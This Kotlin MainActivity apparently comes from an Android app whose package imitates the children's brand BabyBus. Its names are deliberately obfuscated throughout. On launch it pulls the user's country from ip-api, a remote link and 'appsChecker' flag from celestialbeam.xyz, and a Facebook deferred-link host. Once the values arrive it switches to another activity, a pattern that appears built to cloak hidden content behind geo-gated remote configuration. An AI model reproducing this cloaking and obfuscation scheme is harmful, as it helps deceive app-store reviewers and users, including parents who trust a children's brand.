package com.sinyee.babybus.marke.maaaaaaain


import com.sinyee.babybus.marke.appplica.Cossssik.georator
import com.sinyee.babybus.marke.appplica.Cossssik.linkatorr
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.sinyee.babybus.marke.appplica.Cossssik.deeeplator
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import com.sinyee.babybus.marke.appplica.Cossssik.appsCheckfrr6frfr
import com.sinyee.babybus.marke.appplica.Cossssik.countrator
import com.sinyee.babybus.marke.appplica.ssserrrvvivi.ServiceAptgtgtgtgtg
import com.sinyee.babybus.marke.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit


class MainActivity : AppCompatActivity() {

    private suspend fun getDataDev() {

        val yhhyyyh = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://celestialbeam.xyz/")
            .build()
            .create(ServiceAptgtgtgtgtg::class.java)
        val frfrrfgr = yhhyyyh.getDataDevaaaaaa().body()?.gyhyhy.toString()
        val appsCheckerfgtt = yhhyyyh.getDataDevaaaaaa().body()?.appsCheckergtgttgtgt.toString()
        val retroDatafrffr = yhhyyyh.getDataDevaaaaaa().body()?.geofgtt.toString()


        Hawk.put(linkatorr, frfrrfgr)
        Hawk.put(appsCheckfrr6frfr, appsCheckerfgtt)
        Hawk.put(georator, retroDatafrffr)

    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        vfbggbggbbg = ActivityMainBinding.inflate(layoutInflater)
        setContentView(vfbggbggbbg.root)

        vfnvfjvfjvfnjvf(this)

        val vfffffvfvfvf5 = Executors.newSingleThreadScheduledExecutor()
        var jujikii666: String? = Hawk.get(countrator, null)
        var kogkkkkgtk: String? = Hawk.get(georator, null)
        vfffffvfvfvf5.scheduleAtFixedRate({
            if (jujikii666 != null && kogkkkkgtk != null) {
                vfffffvfvfvf5.shutdown()
                gttgtth()
            } else {
                jujikii666 = Hawk.get(countrator)
                kogkkkkgtk = Hawk.get(georator)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            frfrrfrf
        }
    }

    private lateinit var vfbggbggbbg: ActivityMainBinding

    fun vfnvfjvfjvfnjvf(gtgtgttggtgt: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            gtgtgttggtgt
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val gtkogtkogtkkgto = appLinkData.targetUri.host.toString()
                Hawk.put(deeeplator, gtkogtkogtkkgto)
            }
            if (appLinkData == null) {
            }
        }
    }

    private suspend fun getDatafrgtt() {
        val gtgtktogttgkkgt = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceAptgtgtgtgtg::class.java)
        val vfnjvfnjvfnvfn = gtgtktogttgkkgt.getDatafffffffff().body()?.countryCodefgtgt

        Hawk.put(countrator, vfnjvfnjvfnvfn)
    }

    private val frfrrfrf: Job = GlobalScope.launch(Dispatchers.IO) {
        getDatafrgtt()
        getDataDev()
    }

    private fun gttgtth() {
        val frfrgrt = Intent(this@MainActivity, FilOnnnuActivity::class.java)
        startActivity(frfrgrt)
        fkrrfjijfjfrjr()
    }

    private fun fkrrfjijfjfrjr() {
        finish()
    }


}